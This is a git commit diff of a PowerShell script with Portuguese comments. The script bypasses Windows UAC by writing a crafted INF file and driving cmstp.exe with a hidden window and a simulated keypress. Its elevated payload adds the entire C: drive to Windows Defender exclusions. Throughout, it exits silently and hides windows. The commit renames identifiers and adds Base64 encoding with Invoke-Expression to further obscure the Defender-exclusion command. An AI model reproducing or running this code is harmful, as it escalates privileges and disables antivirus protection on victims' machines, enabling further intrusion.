17b51e6214f7f46fb383cbaa8681e26eb58afb84
am0rimxc <snoopbrgg00@gmail.com>
2024-10-21 17:34:30 +0100

    Update loli.ps1

--- loli.ps1
+++ loli.ps1
@@ -1,4 +1,4 @@
-function latencyx-Invoke-UAC
+function invoke-UACBypass
 {
 <#
  
@@ -6,49 +6,49 @@ function latencyx-Invoke-UAC
 Este script serve para fazer um bypass de UAC (Controle de Contas de Usuário) em um Windows onde o usuário atual está no grupo de administradores e a configuração de UAC está no padrão. Ele eleva os privilégios de maneira transparente.
 
 .DESCRIPTION
-Este script usa código em C# para ser carregado na memória com PowerShell usando reflection, e então invoca a função `latencyx-Execute` do código C# carregado, que executará o comando com altos privilégios (administrador).
+Este script usa código em C# para ser carregado na memória com PowerShell usando reflection, e então invoca a função `executeBypass` do código C# carregado, que executará o comando com altos privilégios (administrador).
 
 .PARAMETER Executable
 .PARAMETER Command
 
 .EXAMPLE
-latencyx-Invoke-UAC -latencyxExecutable "powershell" -latencyxCommand ".('Add-MpP' + 'reference') -ExclusionPath C:\"
+invoke-UACBypass -execApp "powershell" -latencyxCommand ".('Add-MpP' + 'reference') -ExclusionPath C:\" 
 
 #>
 
 param(
     [Parameter(Mandatory = $true)]
-    [string]$latencyxExecutable,
+    [string]$execApp,
  
     [Parameter()]
     [string]$latencyxCommand
 )
 
-$latencyxInfData = @'
+$infTemplate = @'
 [version]
 Signature=$chicago$
 AdvancedINF=2.5
 
 [DefaultInstall]
-CustomDestination=latencyx-CustInstDestSectionAllUsers
-RunPreSetupCommands=latencyx-RunPreSetupCommandsSection
+CustomDestination=bypass-CustomSectionAllUsers
+RunPreSetupCommands=bypass-RunSetupCommands
 
-[latencyx-RunPreSetupCommandsSection]
-LINE
+[bypass-RunSetupCommands]
+TASK
 taskkill /IM cmstp.exe /F
 
-[latencyx-CustInstDestSectionAllUsers]
-49000,49001=latencyx-AllUSer_LDIDSection, 7
+[bypass-CustomSectionAllUsers]
+49000,49001=bypass-AllUserLDIDSection, 7
 
-[latencyx-AllUSer_LDIDSection]
+[bypass-AllUserLDIDSection]
 "HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
 
 [Strings]
-ServiceName="latencyxVPN"
-ShortSvcName="latencyxVPN"
+ServiceName="bypassVPN"
+ShortSvcName="bypassVPN"
 '@
 
-$latencyxCode = @"
+$embeddedCode = @"
 using System;
 using System.Threading;
 using System.Text;
@@ -57,7 +57,7 @@ using System.Diagnostics;
 using System.ComponentModel;
 using System.Runtime.InteropServices;
 
-public class latencyxCMSTPBypass
+public class BypassCMSTP
 {
     [DllImport("Shell32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd);
@@ -68,127 +68,142 @@ public class latencyxCMSTPBypass
     [DllImport("user32.dll")]
     static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
 
-    public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
+    public static string cmstpPath = "c:\\windows\\system32\\cmstp.exe";
 
-    public static string SetInfFile(string CommandToExecute, string InfData)
+    public static string CreateInfFile(string cmdToRun, string infContent)
     {
-        StringBuilder OutputFile = new StringBuilder();
-        OutputFile.Append("C:\\windows\\temp");
-        OutputFile.Append("\\");
-        OutputFile.Append(Path.GetRandomFileName().Split(Convert.ToChar("."))[0]);
-        OutputFile.Append(".inf");
-        StringBuilder newInfData = new StringBuilder(InfData);
-        newInfData.Replace("LINE", CommandToExecute);
-        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
-        return OutputFile.ToString();
+        StringBuilder outputFilePath = new StringBuilder();
+        outputFilePath.Append("C:\\windows\\temp");
+        outputFilePath.Append("\\");
+        outputFilePath.Append(Path.GetRandomFileName().Split(Convert.ToChar("."))[0]);
+        outputFilePath.Append(".inf");
+        StringBuilder newInfContent = new StringBuilder(infContent);
+        newInfContent.Replace("TASK", cmdToRun);
+        File.WriteAllText(outputFilePath.ToString(), newInfContent.ToString());
+        return outputFilePath.ToString();
     }
 
-    public static bool latencyxExecute(string CommandToExecute, string InfData)
+    public static bool ExecuteCommand(string cmdToRun, string infContent)
     {
         const int WM_SYSKEYDOWN = 0x0100;
         const int VK_RETURN = 0x0D;
 
-        StringBuilder InfFile = new StringBuilder();
-        InfFile.Append(SetInfFile(CommandToExecute, InfData));
+        StringBuilder infFile = new StringBuilder();
+        infFile.Append(CreateInfFile(cmdToRun, infContent));
 
-        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
-        startInfo.Arguments = "/au " + InfFile.ToString();
+        ProcessStartInfo startInfo = new ProcessStartInfo(cmstpPath);
+        startInfo.Arguments = "/au " + infFile.ToString();
         startInfo.WindowStyle = ProcessWindowStyle.Hidden;  // Oculta a janela
         IntPtr dptr = Marshal.AllocHGlobal(1);
-        ShellExecute(dptr, "", BinaryPath, startInfo.Arguments, "", 0);
+        ShellExecute(dptr, "", cmstpPath, startInfo.Arguments, "", 0);
 
         Thread.Sleep(3000);
-        IntPtr WindowToFind = FindWindow(null, "latencyxVPN");
+        IntPtr uacWindow = FindWindow(null, "bypassVPN");
 
-        PostMessage(WindowToFind, WM_SYSKEYDOWN, VK_RETURN, 0);
+        PostMessage(uacWindow, WM_SYSKEYDOWN, VK_RETURN, 0);
         Thread.Sleep(5000);
-        File.Delete(InfFile.ToString());
+        File.Delete(infFile.ToString());
         return true;
     }
 }
 "@
 
-$latencyxConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
-$latencyxSecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop
-if ($latencyxConsentPrompt -Eq 2 -and $latencyxSecureDesktopPrompt -Eq 1) {
-    return  # Silenciosamente sai se UAC estiver em "Notificar sempre"
+$consentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
+$secureDesktop = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop
+if ($consentPrompt -Eq 2 -and $secureDesktop -Eq 1) {
+    return  # Sai silenciosamente se UAC estiver em "Notificar sempre"
 }
 
 try {
-    $latencyxUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-    $latencyxAdm = Get-LocalGroupMember -SID S-1-5-32-544 | Where-Object { $_.Name -eq $latencyxUser }
+    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+    $isAdmin = Get-LocalGroupMember -SID S-1-5-32-544 | Where-Object { $_.Name -eq $currentUser }
 } catch {
-    $latencyxUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-    $latencyxAdminGroupSID = 'S-1-5-32-544'
-    $latencyxAdminGroup = Get-WmiObject -Class Win32_Group | Where-Object { $_.SID -eq $latencyxAdminGroupSID }
-    $latencyxMembers = $latencyxAdminGroup.GetRelated("Win32_UserAccount")
-    $latencyxMembers | ForEach-Object { if ($_.Caption -eq $latencyxUser) { $latencyxAdm = $true } }
+    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+    $adminGroupSID = 'S-1-5-32-544'
+    $adminGroup = Get-WmiObject -Class Win32_Group | Where-Object { $_.SID -eq $adminGroupSID }
+    $groupMembers = $adminGroup.GetRelated("Win32_UserAccount")
+    $groupMembers | ForEach-Object { if ($_.Caption -eq $currentUser) { $isAdmin = $true } }
 }
 
-if (!$latencyxAdm) {
-    return  # Silenciosamente sai se o usuário não é administrador
+if (!$isAdmin) {
+    return  # Sai silenciosamente se o usuário não é administrador
 }
 
 try {
-    if (![System.IO.File]::Exists($latencyxExecutable)) {
-        $latencyxEx = (Get-Command $latencyxExecutable)
-        if (![System.IO.File]::Exists($latencyxEx.Source)) {
-            $latencyxExecutable = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($latencyxExecutable)
-            if (![System.IO.File]::Exists($latencyxExecutable)) {
-                return  # Silenciosamente sai se o executável não for encontrado
+    if (![System.IO.File]::Exists($execApp)) {
+        $cmd = (Get-Command $execApp)
+        if (![System.IO.File]::Exists($cmd.Source)) {
+            $execApp = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($execApp)
+            if (![System.IO.File]::Exists($execApp)) {
+                return  # Sai silenciosamente se o executável não for encontrado
             }
         } else {
-            $latencyxExecutable = (Get-Command $latencyxExecutable).Name
+            $execApp = (Get-Command $execApp).Name
         }
     }
 } catch {
-    return  # Silenciosamente sai em caso de erro
+    return  # Sai silenciosamente em caso de erro
 }
 
-if ($latencyxExecutable.Contains("powershell")) {
+if ($execApp.Contains("powershell")) {
     if ($latencyxCommand -ne "") {
-        $latencyxFinal = "powershell -WindowStyle Hidden -c ""$latencyxCommand"""  # Oculta a janela do PowerShell
+        $finalCmd = "powershell -WindowStyle Hidden -c ""$latencyxCommand"""  # Oculta a janela do PowerShell
     } else {
-        $latencyxFinal = "$latencyxExecutable $latencyxCommand"
+        $finalCmd = "$execApp $latencyxCommand"
     }
-} elseif ($latencyxExecutable.Contains("cmd")) {
+} elseif ($execApp.Contains("cmd")) {
     if ($latencyxCommand -ne "") {
-        $latencyxFinal = "cmd /k ""$latencyxCommand"""
+        $finalCmd = "cmd /k ""$latencyxCommand"""
     } else {
-        $latencyxFinal = "$latencyxExecutable $latencyxCommand"
+        $finalCmd = "$execApp $latencyxCommand"
     }
 } else {
-    $latencyxFinal = "$latencyxExecutable $latencyxCommand"
+    $finalCmd = "$execApp $latencyxCommand"
 }
 
-function latencyxExecute {
+function ExecuteBypass {
     try {
-        $latencyxResult = [latencyxCMSTPBypass]::latencyxExecute($latencyxFinal, $latencyxInfData)
+        $result = [BypassCMSTP]::ExecuteCommand($finalCmd, $infTemplate)
     } catch {
-        Add-Type $latencyxCode
-        $latencyxResult = [latencyxCMSTPBypass]::latencyxExecute($latencyxFinal, $latencyxInfData)
+        Add-Type $embeddedCode
+        $result = [BypassCMSTP]::ExecuteCommand($finalCmd, $infTemplate)
     }
 
-    if ($latencyxResult) {
-        return  # Silenciosamente sai se a elevação for bem-sucedida
+    if ($result) {
+        return  # Sai silenciosamente se a elevação for bem-sucedida
     } else {
-        return  # Silenciosamente sai se ocorrer um erro
+        return  # Sai silenciosamente se ocorrer um erro
     }
 }
 
-$latencyxProcess = ((Get-WmiObject -Class win32_process).name | Select-String "cmstp" | Select-Object * -First 1).Pattern
-if ($latencyxProcess -eq "cmstp") {
+$cmstpProcess = ((Get-WmiObject -Class win32_process).name | Select-String "cmstp" | Select-Object * -First 1).Pattern
+if ($cmstpProcess -eq "cmstp") {
     try {
         Stop-Process -Name "cmstp" -Force
-        latencyxExecute
+        ExecuteBypass
     } catch {
-        return  # Silenciosamente sai se houver erro ao fechar cmstp
+        return  # Sai silenciosamente se houver erro ao fechar cmstp
     }
 } else {
-    latencyxExecute
+    ExecuteBypass
 }
 
 }
 
-# Chamada da função
-latencyx-Invoke-UAC -latencyxExecutable "powershell" -latencyxCommand ".('Add-MpP' + 'reference') -ExclusionPath C:\"
+# Converte o comando em Base64
+$command = ".('Add-MpP' + 'reference') -ExclusionPath C:\" 
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+
+# Função que executa o comando decodificado
+function invoke-DecodedCommand {
+    param (
+        [string]$encodedCommand
+    )
+    $decodedBytes = [Convert]::FromBase64String($encodedCommand)
+    $decodedCommand = [System.Text.Encoding]::Unicode.GetString($decodedBytes)
+    Invoke-Expression $decodedCommand
+}
+
+# Chama a função com o comando ofuscado
+invoke-DecodedCommand -encodedCommand $encodedCommand
